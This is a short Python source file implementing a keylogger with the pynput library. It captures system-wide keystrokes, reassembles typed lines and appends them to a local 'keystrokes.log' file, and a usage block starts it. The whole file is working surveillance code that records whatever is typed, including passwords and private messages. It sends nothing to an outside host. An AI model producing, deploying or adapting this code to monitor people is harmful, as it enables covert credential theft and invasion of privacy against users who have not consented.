from pynput.keyboard import Listener, Key
import logging

class KeyLogger:
    def __init__(self, log_file):
        self.log_file = log_file
        self.listener = Listener(on_press=self.on_press, on_release=self.on_release)
        self.current_sentence = []

    def start(self):
        self.listener.start()
        logging.info("Keylogger started.")

    def stop(self):
        self.listener.stop()
        logging.info("Keylogger stopped.")

    def on_press(self, key):
        key_name = self.get_key_name(key)
        if key_name == '\n':
            self.log_keystrokes()
            self.current_sentence = []
        elif key_name == '[BACKSPACE]' and self.current_sentence:
            self.current_sentence.pop()
        else:
            self.current_sentence.append(key_name)

    def on_release(self, key):
        if key == Key.esc:
            self.log_keystrokes()
            self.stop()
            return False

    def get_key_name(self, key):
        if key == Key.space:
            return ' '
        elif key == Key.enter:
            return '\n'
        elif key == Key.backspace:
            return '[BACKSPACE]'
        elif hasattr(key, 'char') and key.char:
            return key.char
        else:
            return ''

    def log_keystrokes(self):
        if self.current_sentence:
            with open(self.log_file, 'a') as f:
                f.write(''.join(self.current_sentence) + '\n')

# Usage
if __name__ == "__main__":
    logging.basicConfig(level=logging.INFO)
    keylogger = KeyLogger("keystrokes.log")
    keylogger.start()
